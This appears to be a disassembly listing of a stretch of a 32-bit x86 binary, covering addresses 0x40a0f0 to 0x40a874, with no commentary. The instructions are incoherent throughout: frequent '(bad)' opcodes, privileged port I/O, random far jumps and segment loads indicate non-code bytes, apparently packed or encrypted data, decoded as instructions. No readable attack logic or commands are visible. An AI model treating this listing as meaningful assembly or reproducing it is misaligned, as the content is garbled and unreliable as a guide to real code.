  40a0f0:	ins    BYTE PTR es:[edi],dx
  40a0f1:	fdivr  st,st(0)
  40a0f3:	mov    dh,0xf2
  40a0f5:	aam    0xc
  40a0f7:	popf   
  40a0f8:	mov    ebp,0x4e863b13
  40a0fd:	jl     0x40a092
  40a0ff:	(bad)  
  40a100:	jecxz  0x40a14b
  40a102:	loope  0x40a104
  40a104:	push   cs
  40a105:	arpl   WORD PTR [ebx-0x59],bp
  40a108:	jecxz  0x40a09d
  40a10a:	shr    DWORD PTR [ebp-0x6192e91a],1
  40a110:	add    BYTE PTR [ebp+0x6c024f49],al
  40a116:	(bad)  
  40a117:	in     eax,0xdd
  40a119:	sbb    eax,0x1872323b
  40a11e:	popa   
  40a11f:	jp     0x40a119
  40a121:	xor    al,0xe8
  40a123:	push   esi
  40a124:	out    dx,al
  40a125:	fsubr  DWORD PTR [ebx]
  40a127:	loope  0x40a153
  40a129:	sar    BYTE PTR [ebp+0x2c832baf],0x5b
  40a130:	ins    BYTE PTR es:[edi],dx
  40a131:	call   FWORD PTR [ecx]
  40a133:	cwde   
  40a134:	arpl   WORD PTR [ebx+0x13],si
  40a137:	mov    al,ds:0x2076e320
  40a13c:	lods   al,BYTE PTR ds:[esi]
  40a13d:	push   eax
  40a13e:	and    al,0x20
  40a140:	sbb    BYTE PTR [esi+eiz*4-0x17],bl
  40a144:	ret    
  40a145:	dec    ebx
  40a146:	outs   dx,BYTE PTR ds:[esi]
  40a147:	out    dx,eax
  40a148:	mov    cl,0xfc
  40a14a:	in     al,0xd
  40a14c:	inc    ebp
  40a14d:	cmp    cl,BYTE PTR [edi]
  40a14f:	std    
  40a150:	out    0xba,eax
  40a152:	mov    edi,0xd5529c0d
  40a157:	fptan  
  40a159:	in     eax,dx
  40a15a:	in     eax,0x45
  40a15c:	repz mov gs,WORD PTR [edi+esi*1]
  40a160:	cmp    DWORD PTR [edx-0x56],edi
  40a163:	pop    esp
  40a164:	loope  0x40a15d
  40a166:	mov    ds,WORD PTR [esi+0x6c772353]
  40a16c:	nop
  40a16d:	cmp    al,0xa3
  40a16f:	ss cmp al,0x48
  40a172:	scas   al,BYTE PTR es:[edi]
  40a173:	and    DWORD PTR [ebx+edi*2+0x626aca1a],esp
  40a17a:	data16 xor al,0xfb
  40a17d:	inc    eax
  40a17e:	push   esi
  40a17f:	rcr    BYTE PTR [ebx+0x2a],1
  40a182:	scas   eax,DWORD PTR es:[edi]
  40a183:	data16 das 
  40a185:	jne    0x40a1df
  40a187:	xchg   esi,eax
  40a188:	cmp    ah,BYTE PTR [eax-0x78]
  40a18b:	cmc    
  40a18c:	pusha  
  40a18d:	cmp    BYTE PTR [ebx],al
  40a18f:	fldcw  WORD PTR ds:0x715ca5b8
  40a195:	jb     0x9a6d838c
  40a19b:	adc    ecx,DWORD PTR [edx+ebx*2-0x71]
  40a19f:	mov    cl,0x5
  40a1a1:	lahf   
  40a1a2:	imul   ebx,DWORD PTR [esi-0x68b60ca2],0x3d32c42
  40a1ac:	lods   eax,DWORD PTR ds:[esi]
  40a1ad:	mov    ch,0x3e
  40a1af:	gs sub ah,al
  40a1b2:	add    eax,0xb8ec5fea
  40a1b7:	xchg   ecx,eax
  40a1b8:	sub    DWORD PTR [ecx-0x47455765],0x85f7c80b
  40a1c2:	jecxz  0x40a226
  40a1c4:	mov    esi,0x6f2ff6aa
  40a1c9:	dec    edx
  40a1ca:	mov    eax,0xd302d40
  40a1cf:	xchg   edx,eax
  40a1d0:	xchg   ecx,eax
  40a1d1:	mov    dl,0x3b
  40a1d3:	cmc    
  40a1d4:	pop    ds
  40a1d5:	gs (bad) 
  40a1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d8:	stc    
  40a1d9:	popa   
  40a1da:	sar    BYTE PTR [edx-0x7b17d6d3],cl
  40a1e0:	xchg   BYTE PTR [ecx+0x65442e1b],dl
  40a1e6:	mov    cl,0x80
  40a1e8:	int    0x3d
  40a1ea:	mov    bh,0xe3
  40a1ec:	jmp    0x40a1cf
  40a1ee:	jl     0x40a218
  40a1f0:	rol    BYTE PTR [edx+0x7e525aec],cl
  40a1f6:	stos   DWORD PTR es:[edi],eax
  40a1f7:	nop
  40a1f8:	mov    bl,0x87
  40a1fa:	aad    0xab
  40a1fc:	mov    al,0x2e
  40a1fe:	sbb    al,0xcb
  40a200:	fs mov dh,0xb9
  40a203:	xor    dl,ch
  40a205:	aam    0x27
  40a207:	sbb    DWORD PTR [eax],0x78d56400
  40a20d:	imul   esp,DWORD PTR [edx],0x5b
  40a210:	outs   dx,DWORD PTR ds:[esi]
  40a211:	mov    ch,0x95
  40a213:	mov    dl,0x8c
  40a215:	mov    ds:0xedabee2b,al
  40a21a:	lds    edx,FWORD PTR [ebp+0x71]
  40a21d:	inc    ecx
  40a21e:	xchg   ecx,eax
  40a21f:	jno    0x40a26c
  40a221:	mov    cl,dl
  40a223:	mov    ds:0xc401e8e4,eax
  40a228:	lock retf 
  40a22a:	outs   dx,DWORD PTR ds:[esi]
  40a22b:	pop    ds
  40a22c:	sub    DWORD PTR [ebp+eiz*8-0x4f],ebx
  40a230:	xlat   BYTE PTR ds:[ebx]
  40a231:	dec    ebx
  40a232:	mov    bl,0xd0
  40a234:	mov    dh,0xd2
  40a236:	mov    bl,0x7f
  40a238:	inc    esi
  40a239:	bound  eax,QWORD PTR [eax+0x1a]
  40a23c:	dec    edx
  40a23d:	sub    esp,DWORD PTR [ebp-0x30af5ca4]
  40a243:	mov    esp,0x864bf7dc
  40a248:	adc    al,0x2c
  40a24a:	and    eax,0xa2029cf1
  40a24f:	adc    eax,0x464769f
  40a254:	call   0xa2a0:0xf13839f
  40a25b:	or     BYTE PTR [edi],cl
  40a25d:	daa    
  40a25e:	mov    cl,0x60
  40a260:	adc    edx,eax
  40a262:	stos   DWORD PTR es:[edi],eax
  40a263:	cmp    ebp,DWORD PTR [eax+ebx*2]
  40a266:	push   edx
  40a267:	loop   0x40a21f
  40a269:	jmp    0x40a276
  40a26b:	dec    ebp
  40a26c:	pop    esi
  40a26d:	jmp    0x40a2b3
  40a26f:	test   DWORD PTR [ecx],edx
  40a271:	sub    al,0x12
  40a273:	inc    esp
  40a274:	and    DWORD PTR [esi+0x21ea300f],ebx
  40a27a:	aas    
  40a27b:	pop    ebp
  40a27c:	lods   eax,DWORD PTR ds:[esi]
  40a27d:	xchg   ecx,eax
  40a27e:	or     eax,0x82be02e3
  40a283:	ja     0x40a214
  40a285:	dec    esi
  40a286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a287:	sbb    eax,0x642811de
  40a28c:	stos   WORD PTR es:[edi],ax
  40a28e:	sar    DWORD PTR [ecx+eax*8],1
  40a291:	add    ch,bh
  40a293:	mov    DWORD PTR [edx+0x65eda71b],0x423f9425
  40a29d:	enter  0x8673,0x9b
  40a2a1:	mov    ch,0x84
  40a2a3:	test   bl,bl
  40a2a5:	push   edx
  40a2a6:	pop    ss
  40a2a7:	jbe    0x40a2ce
  40a2a9:	cmp    DWORD PTR [ebp-0x65d80bc],eax
  40a2af:	xor    al,0x9d
  40a2b1:	jo     0x40a30f
  40a2b3:	pop    esi
  40a2b4:	push   cs
  40a2b5:	scas   al,BYTE PTR es:[edi]
  40a2b6:	fadd   st,st(0)
  40a2b8:	add    eax,0x42de6edc
  40a2bd:	nop
  40a2be:	jbe    0x40a31d
  40a2c0:	test   eax,edx
  40a2c2:	inc    ebx
  40a2c3:	addr16 cld 
  40a2c5:	sbb    bl,BYTE PTR [ebp-0x35]
  40a2c8:	arpl   si,cx
  40a2ca:	adc    DWORD PTR [edi+0x36],eax
  40a2cd:	mov    ebx,0xbd8a990d
  40a2d2:	or     eax,0xe9d14993
  40a2d7:	(bad)  
  40a2d8:	loopne 0x40a2da
  40a2da:	popf   
  40a2db:	mov    dh,0xd8
  40a2dd:	xor    eax,0x8ef74ce0
  40a2e2:	shl    bl,0x7e
  40a2e5:	daa    
  40a2e6:	xchg   bh,ch
  40a2e8:	mov    esi,0xd5955d1d
  40a2ed:	je     0x40a32c
  40a2ef:	add    DWORD PTR [edx],0x5a
  40a2f2:	hlt    
  40a2f3:	mov    DWORD PTR [edi+0x48c40509],ecx
  40a2f9:	mov    eax,0x34cf3737
  40a2fe:	jbe    0x40a299
  40a300:	js     0x40a2c1
  40a302:	add    eax,0x132b9635
  40a307:	ret    
  40a308:	add    eax,0x54fa0709
  40a30d:	fidivr DWORD PTR cs:[ebp+0x6132c27f]
  40a314:	xchg   ebp,eax
  40a315:	repz data16 icebp 
  40a318:	lods   eax,DWORD PTR ds:[esi]
  40a319:	inc    esp
  40a31a:	and    dh,BYTE PTR [ecx-0x4d]
  40a31d:	retf   
  40a31e:	out    0x6a,al
  40a320:	cdq    
  40a321:	mov    edi,0x599a78d0
  40a326:	in     eax,dx
  40a327:	ins    DWORD PTR es:[edi],dx
  40a328:	(bad)  
  40a32a:	jecxz  0x40a399
  40a32c:	pop    esi
  40a32d:	popa   
  40a32e:	ins    DWORD PTR es:[edi],dx
  40a32f:	jmp    0xf4b5:0xbd7eda85
  40a336:	lds    ebp,FWORD PTR [esi-0x56382297]
  40a33c:	xchg   edi,eax
  40a33d:	jne    0x40a2ee
  40a33f:	dec    ebp
  40a340:	pop    edx
  40a341:	vpunpckldq xmm3,xmm1,XMMWORD PTR [eax]
  40a345:	add    DWORD PTR [ecx],edx
  40a347:	jbe    0x40a35b
  40a349:	imul   ecx,DWORD PTR [edi-0x2b],0x761e33d6
  40a350:	cmc    
  40a351:	mov    eax,0x7cc9283e
  40a356:	mov    ecx,0xc54b0add
  40a35b:	(bad)  
  40a35c:	(bad)  
  40a35d:	(bad)  [esi-0x16]
  40a360:	sar    al,cl
  40a362:	inc    edx
  40a363:	cli    
  40a364:	mov    dh,BYTE PTR [eax-0x47f5ccdc]
  40a36a:	mov    cs,WORD PTR [esi-0x2922e14a]
  40a370:	jnp    0x40a3dd
  40a372:	shr    DWORD PTR [ebx+0x3bca6c80],cl
  40a378:	add    edx,DWORD PTR [esp+edx*4+0x3dc7b2bd]
  40a37f:	mov    ds:0xd0c001c2,eax
  40a384:	add    DWORD PTR [edi+0x2d],esp
  40a387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a388:	nop
  40a389:	push   ecx
  40a38a:	lock jmp 0x40a368
  40a38d:	ja     0x40a33b
  40a38f:	fnstsw WORD PTR [eax+0x6b]
  40a392:	ret    
  40a393:	nop
  40a394:	pop    esp
  40a395:	pop    edx
  40a396:	jmp    0x9fbd:0xb7b39222
  40a39d:	frndint 
  40a39f:	mov    dh,0x34
  40a3a1:	loope  0x40a3f7
  40a3a3:	push   esp
  40a3a4:	pop    ecx
  40a3a5:	push   0xbe89bdd0
  40a3aa:	sbb    ebx,DWORD PTR [ebp+0x3c2a2c6f]
  40a3b0:	mov    edx,0x96fe76d5
  40a3b5:	cli    
  40a3b6:	std    
  40a3b7:	rol    BYTE PTR [ebp-0x16],1
  40a3ba:	outs   dx,BYTE PTR ds:[esi]
  40a3bb:	sub    eax,0x83edac51
  40a3c0:	faddp  st(7),st
  40a3c2:	add    DWORD PTR [edi],eax
  40a3c4:	(bad)  
  40a3c5:	push   0xcd474c06
  40a3ca:	sbb    ebp,DWORD PTR [edi-0x633a6d1]
  40a3d0:	mov    al,ds:0x708594c5
  40a3d5:	sbb    DWORD PTR [ecx],0x2920f46b
  40a3db:	push   ds
  40a3dc:	dec    edi
  40a3dd:	adc    eax,0x9f175411
  40a3e2:	call   0xba4197b7
  40a3e7:	loopne 0x40a38d
  40a3e9:	adc    esp,eax
  40a3eb:	popf   
  40a3ec:	mov    esi,0x4df8d98c
  40a3f1:	pop    ebp
  40a3f2:	sbb    ebx,DWORD PTR [edx-0x6871d113]
  40a3f8:	popf   
  40a3f9:	jns    0x40a386
  40a3fb:	test   BYTE PTR [edi+edx*8+0x1eb28cc4],dh
  40a402:	push   ss
  40a403:	arpl   WORD PTR [esp+ecx*1+0x214b788c],bx
  40a40a:	shl    BYTE PTR [eax+0x2b28cd3e],0xab
  40a411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a412:	or     eax,0xf36e90d
  40a417:	push   esi
  40a418:	icebp  
  40a419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a41a:	retf   0x10d7
  40a41d:	mov    eax,0xe6c1a75b
  40a422:	fld    TBYTE PTR [esi-0x26]
  40a425:	jle    0x40a491
  40a427:	in     eax,dx
  40a428:	(bad)  
  40a429:	or     BYTE PTR [ecx-0x6c971c2c],cl
  40a42f:	jg     0x40a455
  40a431:	add    eax,0x7ebf6c65
  40a436:	ror    ch,1
  40a438:	and    dh,BYTE PTR [ecx]
  40a43a:	pop    es
  40a43b:	xchg   esp,eax
  40a43c:	mov    fs,WORD PTR ds:0x9dda4a74
  40a442:	xor    edx,esi
  40a444:	sar    DWORD PTR [eax-0x1],cl
  40a447:	aad    0x91
  40a449:	push   ss
  40a44a:	dec    edx
  40a44b:	ins    BYTE PTR es:[edi],dx
  40a44c:	and    ecx,edi
  40a44e:	jnp    0x40a429
  40a450:	add    edx,edx
  40a452:	fmul   QWORD PTR [eax+0x41]
  40a455:	test   cl,dh
  40a457:	cld    
  40a458:	xlat   BYTE PTR ds:[ebx]
  40a459:	sbb    eax,0xa5adec85
  40a45e:	dec    eax
  40a45f:	cmp    BYTE PTR [ebp-0x7f0b222c],cl
  40a465:	xor    esp,DWORD PTR [ebx+0x18]
  40a468:	add    bl,0xb4
  40a46b:	mov    esi,0x64d7745f
  40a470:	mov    WORD PTR [esi+0x6afa8510],cs
  40a476:	int3   
  40a477:	(bad)  
  40a478:	jmp    0xed6f2ebb
  40a47d:	inc    ebx
  40a47e:	push   cs
  40a47f:	shr    ebp,0x29
  40a482:	inc    edi
  40a483:	or     esi,DWORD PTR [esi-0x72f0bd63]
  40a489:	sub    DWORD PTR [esi-0xe],eax
  40a48c:	xor    eax,DWORD PTR [edi+0x60]
  40a48f:	aaa    
  40a490:	pop    es
  40a491:	jecxz  0x40a454
  40a493:	sub    DWORD PTR [ebp-0x4c],ebp
  40a496:	js     0x40a471
  40a498:	and    DWORD PTR [eax-0x48],edx
  40a49b:	pop    es
  40a49c:	addr16 or eax,0xbfe75728
  40a4a2:	xchg   esp,eax
  40a4a3:	out    dx,al
  40a4a4:	lock out 0x43,eax
  40a4a7:	sub    al,0xc4
  40a4a9:	mov    cl,0x48
  40a4ab:	adc    BYTE PTR [ebx-0x63d6c4a],bl
  40a4b1:	sub    DWORD PTR [edx+0x48108c8f],0x2951f8dc
  40a4bb:	(bad)  
  40a4bc:	icebp  
  40a4bd:	mov    ah,0xd7
  40a4bf:	lds    ebx,FWORD PTR [esi+0x16]
  40a4c2:	not    DWORD PTR [edx-0x59c657a6]
  40a4c8:	cs ret 0xae3f
  40a4cc:	jne    0x40a452
  40a4ce:	(bad)  
  40a4cf:	test   eax,0x93fa4125
  40a4d4:	loope  0x40a49d
  40a4d6:	retf   0x83b8
  40a4d9:	out    0x8d,eax
  40a4db:	mov    cl,0x1b
  40a4dd:	rcl    BYTE PTR [ebp+0x70],1
  40a4e0:	hlt    
  40a4e1:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40a4e3:	in     al,dx
  40a4e4:	pop    ebx
  40a4e5:	adc    dh,BYTE PTR [edx-0xb]
  40a4e8:	jae    0x40a50a
  40a4ea:	sbb    ebp,DWORD PTR [edi-0xa33165b]
  40a4f0:	push   esi
  40a4f1:	(bad)  
  40a4f2:	push   0x78861771
  40a4f7:	adc    al,0x5
  40a4f9:	sub    al,0x0
  40a4fb:	or     eax,0xbd743c5d
  40a500:	add    eax,0xf200dc8e
  40a505:	fmul   st,st(1)
  40a507:	pop    ss
  40a508:	sbb    eax,0x58affa5c
  40a50d:	sbb    ecx,DWORD PTR [edx+0x1f268ecf]
  40a513:	mov    ds:0x8e6523d1,eax
  40a518:	jo     0x40a4c7
  40a51a:	cmc    
  40a51b:	inc    BYTE PTR [ebp+0x5b]
  40a51e:	cmp    eax,0x89c74b71
  40a523:	push   0x66
  40a525:	mov    ah,0x98
  40a527:	fstp   st(1)
  40a529:	loop   0x40a4cb
  40a52b:	aas    
  40a52c:	pop    eax
  40a52d:	into   
  40a52e:	push   esi
  40a52f:	sbb    eax,0x9d6f10e5
  40a534:	nop
  40a535:	mov    ebp,0x6155f98f
  40a53a:	mov    edx,0xe536f7f0
  40a53f:	out    0xc0,al
  40a541:	lea    esi,[ebp+0x63]
  40a544:	push   edi
  40a545:	sbb    eax,0x2cc77501
  40a54a:	push   ss
  40a54b:	out    0xbc,al
  40a54d:	sbb    al,0xf6
  40a54f:	add    al,0xed
  40a551:	or     BYTE PTR [ebp+0x2e],dh
  40a554:	mov    dh,BYTE PTR [eax-0x6f1e8fc6]
  40a55a:	mov    BYTE PTR [esi+eiz*2-0x50],ch
  40a55e:	jns    0x40a533
  40a560:	imul   ebp,ebp,0x1d4fdaa4
  40a566:	cli    
  40a567:	jbe    0x40a583
  40a569:	inc    ebx
  40a56a:	mov    ebx,0x474f232b
  40a56f:	lods   eax,DWORD PTR ds:[esi]
  40a570:	mov    dl,0xc4
  40a572:	out    dx,al
  40a573:	mov    ebp,0x732f22dd
  40a578:	stos   DWORD PTR es:[edi],eax
  40a579:	test   eax,0xabbe5ba2
  40a57e:	imul   esi
  40a580:	and    ah,BYTE PTR [ebp-0x655ea62c]
  40a586:	test   BYTE PTR [ebx],cl
  40a588:	in     eax,0xb4
  40a58a:	inc    esp
  40a58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a58c:	push   edx
  40a58d:	adc    edi,DWORD PTR [edi]
  40a58f:	inc    ebx
  40a590:	adc    eax,0x66f06773
  40a595:	inc    edx
  40a596:	mov    esp,0x817f77c6
  40a59b:	fmul   DWORD PTR [eax-0x2021a2ba]
  40a5a1:	data16 das 
  40a5a3:	jmp    0xc835ee65
  40a5a8:	push   ds
  40a5a9:	fld    QWORD PTR [edx]
  40a5ab:	pop    edx
  40a5ac:	mov    dl,0xea
  40a5ae:	xor    ebp,DWORD PTR [eax+0x4757b899]
  40a5b4:	adc    ebp,DWORD PTR [ebx]
  40a5b6:	sub    bh,dl
  40a5b8:	xor    bh,al
  40a5ba:	test   dl,0xad
  40a5bd:	xchg   BYTE PTR [ecx],ah
  40a5bf:	jnp    0x40a60c
  40a5c1:	sbb    esp,eax
  40a5c3:	hlt    
  40a5c4:	idiv   DWORD PTR [eax+0x38]
  40a5c7:	jmp    0x20026def
  40a5cc:	jne    0x40a62e
  40a5ce:	rol    BYTE PTR [eax+0x71],cl
  40a5d1:	mov    dl,bh
  40a5d3:	stos   BYTE PTR es:[edi],al
  40a5d4:	retf   0x1f20
  40a5d7:	das    
  40a5d8:	(bad)  
  40a5d9:	mov    ch,0x3
  40a5db:	repnz scas eax,DWORD PTR es:[edi]
  40a5dd:	adc    edi,ecx
  40a5df:	enter  0x1984,0x9
  40a5e3:	dec    edx
  40a5e4:	inc    edi
  40a5e5:	mov    esp,0x7dcce441
  40a5ea:	sti    
  40a5eb:	dec    esi
  40a5ec:	int    0x4
  40a5ee:	xchg   esi,edi
  40a5f0:	aaa    
  40a5f1:	sub    dh,BYTE PTR [eax-0x1e979053]
  40a5f7:	or     al,0x42
  40a5f9:	ds push ecx
  40a5fb:	das    
  40a5fc:	add    al,BYTE PTR ds:0x65bc899a
  40a602:	xlat   BYTE PTR ds:[ebx]
  40a603:	out    0xf,al
  40a605:	jbe    0x40a65f
  40a607:	add    eax,0xbd2e6371
  40a60c:	stc    
  40a60d:	out    0x38,eax
  40a60f:	cmp    edi,eax
  40a611:	outs   dx,BYTE PTR ds:[esi]
  40a612:	or     BYTE PTR [ebx+0xf],dl
  40a615:	ins    BYTE PTR es:[edi],dx
  40a616:	test   BYTE PTR [edi-0x1d],bh
  40a619:	xchg   ebp,eax
  40a61a:	into   
  40a61b:	scas   eax,DWORD PTR es:[edi]
  40a61c:	pop    edi
  40a61d:	adc    al,0xc7
  40a61f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a621:	rcl    DWORD PTR [edi-0x15],1
  40a624:	mov    ebx,DWORD PTR [ebp+0x51e9356f]
  40a62a:	ds fwait
  40a62c:	stc    
  40a62d:	sbb    edx,DWORD PTR [esi-0x7d]
  40a630:	int3   
  40a631:	or     BYTE PTR [edx+0x73cbb063],bl
  40a637:	dec    ebx
  40a638:	stc    
  40a639:	add    cl,BYTE PTR [ecx-0x37]
  40a63c:	sbb    cl,BYTE PTR [eax+0x39b27bea]
  40a642:	sbb    BYTE PTR [esi+0x25],ch
  40a645:	inc    esp
  40a646:	(bad)  [edi]
  40a648:	(bad)  
  40a649:	sub    DWORD PTR [ebp+edi*2-0x54],esi
  40a64d:	mov    WORD PTR [ecx+0x676a835d],cs
  40a653:	iret   
  40a654:	mov    fs,WORD PTR [eax]
  40a656:	inc    edx
  40a657:	or     al,0xbd
  40a659:	jo     0x40a67c
  40a65b:	push   0x5ecf0952
  40a660:	ret    0xc18e
  40a663:	push   es
  40a664:	and    BYTE PTR [edi+ecx*1],ah
  40a667:	dec    edx
  40a668:	js     0x40a650
  40a66a:	ret    
  40a66b:	or     DWORD PTR [esi-0x5a],esp
  40a66e:	pop    ebp
  40a66f:	xchg   edx,eax
  40a670:	shl    bh,cl
  40a672:	dec    ebp
  40a673:	and    al,0xe7
  40a675:	fwait
  40a676:	rcl    DWORD PTR [ebx],cl
  40a678:	xchg   esi,eax
  40a679:	add    DWORD PTR [edx],ebp
  40a67b:	cmp    al,BYTE PTR [ecx]
  40a67d:	jae    0x40a6dc
  40a67f:	leave  
  40a680:	pop    ds
  40a681:	hlt    
  40a682:	jp     0x40a673
  40a684:	push   0xffffffde
  40a686:	xor    al,0xf7
  40a688:	lds    esp,FWORD PTR [ebx+0x40]
  40a68b:	daa    
  40a68c:	mov    cl,BYTE PTR [eax+0xe]
  40a68f:	daa    
  40a690:	mov    DWORD PTR [eax],edx
  40a692:	(bad)  
  40a693:	and    DWORD PTR [eax+0x5f29aa8a],edx
  40a699:	inc    esi
  40a69a:	sbb    ch,ah
  40a69c:	les    ecx,FWORD PTR [edx+0x63]
  40a69f:	add    ebx,edi
  40a6a1:	sahf   
  40a6a2:	test   eax,0x54f4e92d
  40a6a7:	aaa    
  40a6a8:	sbb    bh,dh
  40a6aa:	imul   edx,DWORD PTR [ecx],0x37
  40a6ad:	hlt    
  40a6ae:	nop
  40a6af:	mov    eax,ds:0x789ac7b
  40a6b4:	test   DWORD PTR [ebp-0x35],0x1bd08e74
  40a6bb:	lea    edx,[ebx-0x6b]
  40a6be:	adc    dl,bl
  40a6c0:	adc    BYTE PTR [ebp-0x2a],cl
  40a6c3:	in     al,0x84
  40a6c5:	pop    ds
  40a6c6:	add    esi,DWORD PTR [ebp+ebp*8-0x4299e4c2]
  40a6cd:	sbb    al,0xca
  40a6cf:	xor    eax,0x301c1692
  40a6d4:	sub    edx,ebp
  40a6d6:	cs xor al,0x4b
  40a6d9:	mov    edi,0x3fef9e2
  40a6de:	cmp    ecx,DWORD PTR [eax-0x6967488]
  40a6e4:	rcr    DWORD PTR [eax-0x80],1
  40a6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e8:	mov    ds:0x44377848,eax
  40a6ed:	sar    ch,cl
  40a6ef:	inc    ecx
  40a6f0:	sub    bh,BYTE PTR [edi]
  40a6f2:	jp     0x40a75b
  40a6f4:	jns    0x40a70c
  40a6f6:	ret    0x434d
  40a6f9:	mov    esi,0xfaec6fb6
  40a6fe:	ins    BYTE PTR es:[edi],dx
  40a6ff:	(bad)  
  40a700:	call   FWORD PTR [ebp+0x10]
  40a703:	shl    ecx,1
  40a705:	lods   eax,DWORD PTR ds:[esi]
  40a706:	and    eax,0xfe73763d
  40a70b:	sbb    BYTE PTR [ecx+ecx*1+0x3668a1cf],al
  40a712:	scas   eax,DWORD PTR es:[edi]
  40a713:	inc    edx
  40a714:	cmp    al,0x33
  40a716:	cwde   
  40a717:	aaa    
  40a718:	popf   
  40a719:	imul   esi,edi,0xffffffe1
  40a71c:	or     eax,DWORD PTR [edi+0x6ddc745d]
  40a722:	dec    ebp
  40a723:	push   esi
  40a724:	in     eax,dx
  40a725:	pop    ecx
  40a726:	mov    al,ds:0x90ad258
  40a72b:	inc    eax
  40a72c:	jmp    0x1a91:0x1b75c653
  40a733:	test   BYTE PTR [edx-0x6cb7f9dc],al
  40a739:	cmp    DWORD PTR [edx],eax
  40a73b:	test   al,dh
  40a73d:	fmul   QWORD PTR [edi+0x6945306b]
  40a743:	in     eax,dx
  40a744:	xor    al,0xd5
  40a746:	sub    al,dh
  40a748:	in     al,dx
  40a749:	fmul   QWORD PTR [edi-0x8]
  40a74c:	jo     0x40a701
  40a74e:	popaw  
  40a750:	xchg   esp,eax
  40a751:	pop    edi
  40a752:	imul   esp,DWORD PTR [esi],0x6e
  40a755:	pop    ebp
  40a756:	je     0x40a73f
  40a758:	leave  
  40a759:	jmp    0xffa2:0x2ed6ecbb
  40a760:	mov    bl,0x60
  40a762:	lods   eax,DWORD PTR ds:[esi]
  40a763:	jae    0x40a7ae
  40a765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a766:	cmovle ecx,DWORD PTR [esi-0x4]
  40a76a:	test   DWORD PTR [ebx-0x5b8f2584],eax
  40a770:	(bad)  
  40a771:	imul   DWORD PTR [ecx+0x36]
  40a774:	fisttp WORD PTR [edx]
  40a776:	aaa    
  40a777:	jne    0x40a7b4
  40a779:	mov    dl,0xfc
  40a77b:	add    DWORD PTR [ebx+ecx*1],ebp
  40a77e:	jecxz  0x40a724
  40a780:	out    0xc0,al
  40a782:	lods   eax,DWORD PTR ds:[esi]
  40a783:	sub    dl,BYTE PTR [ebp+0x51562a6c]
  40a789:	stc    
  40a78a:	xor    cl,BYTE PTR [eax-0x3e]
  40a78d:	dec    ecx
  40a78e:	add    ah,BYTE PTR [esi]
  40a790:	ss (bad) 
  40a792:	jae    0x40a783
  40a794:	mov    dl,0x78
  40a796:	loop   0x40a753
  40a798:	inc    ebp
  40a799:	lds    ecx,FWORD PTR [edx-0x5a]
  40a79c:	cmp    ecx,0xeb1e8e19
  40a7a2:	jbe    0x40a7ed
  40a7a4:	int3   
  40a7a5:	mov    esp,0x1e20bf41
  40a7aa:	and    eax,0xd015114c
  40a7af:	sub    BYTE PTR [edi+ecx*1-0x7c],0xb4
  40a7b4:	sbb    esi,DWORD PTR [ecx-0x9]
  40a7b7:	xlat   BYTE PTR ds:[ebx]
  40a7b8:	adc    ebp,esp
  40a7ba:	(bad)  
  40a7bb:	movhps xmm6,QWORD PTR [ebp+0x4f]
  40a7bf:	std    
  40a7c0:	pop    eax
  40a7c1:	ret    
  40a7c2:	fisubr WORD PTR [eax-0x179fffed]
  40a7c8:	cdq    
  40a7c9:	add    dh,BYTE PTR [edx-0x5b]
  40a7cc:	test   BYTE PTR [ebp+0x68],ch
  40a7cf:	push   DWORD PTR [edx]
  40a7d1:	int    0x7d
  40a7d3:	jns    0x40a82d
  40a7d5:	push   ebx
  40a7d6:	bound  edi,QWORD PTR [ecx+0x503f801a]
  40a7dc:	stc    
  40a7dd:	pushf  
  40a7de:	outs   dx,DWORD PTR ds:[esi]
  40a7df:	cmp    al,0xd2
  40a7e1:	mov    bh,0x4
  40a7e3:	pop    ebx
  40a7e4:	jmp    0xd5205cd6
  40a7e9:	adc    BYTE PTR [ecx-0x4a],bh
  40a7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ed:	cmp    al,0x72
  40a7ef:	mov    BYTE PTR [ecx-0x4b81c416],bh
  40a7f5:	mov    ah,0x3
  40a7f7:	lahf   
  40a7f8:	in     al,0xa7
  40a7fa:	pusha  
  40a7fb:	icebp  
  40a7fc:	retf   
  40a7fd:	loope  0x40a7bb
  40a7ff:	xor    BYTE PTR ds:0xfb41,dl
  40a804:	rcl    BYTE PTR [edi+eax*4-0xb284730],1
  40a80b:	jmp    0x1510:0xeb0dc953
  40a812:	mov    esp,0xdf9b6266
  40a817:	popa   
  40a818:	add    bh,0xa2
  40a81b:	or     ebp,DWORD PTR [ecx-0x15]
  40a81e:	int3   
  40a81f:	inc    ebp
  40a820:	sub    esp,0x8e3a99ad
  40a826:	mov    cs,WORD PTR [ebp-0x14]
  40a829:	cdq    
  40a82a:	js     0x40a7d1
  40a82c:	or     ebp,DWORD PTR [edi+0x54]
  40a82f:	push   esi
  40a830:	sahf   
  40a831:	adc    eax,0xf4424125
  40a836:	mov    al,0x4e
  40a838:	mov    eax,ds:0x8ed2c1b4
  40a83d:	std    
  40a83e:	pop    ebp
  40a840:	pop    eax
  40a841:	push   ds
  40a842:	xchg   BYTE PTR [eax+0x6f],dh
  40a845:	sub    al,0x10
  40a847:	scas   eax,DWORD PTR es:[edi]
  40a848:	leave  
  40a849:	das    
  40a84a:	fist   DWORD PTR [eax]
  40a84c:	popf   
  40a84d:	mov    esi,gs
  40a84f:	lahf   
  40a850:	fndisi(8087 only) 
  40a852:	and    DWORD PTR [ebp+0x5d18f028],esp
  40a858:	jb     0x40a81d
  40a85a:	sub    eax,0x99b0b3c4
  40a85f:	sbb    edx,DWORD PTR [ecx-0x14e921bb]
  40a865:	scas   al,BYTE PTR es:[edi]
  40a866:	xchg   ecx,eax
  40a867:	pop    ebp
  40a868:	imul   esp,DWORD PTR [ecx-0x7f],0x5cd84796
  40a86f:	xchg   ebp,eax
  40a870:	cmp    al,0x16
  40a872:	jmp    0x40a847
  40a874:	jge    0x40a899
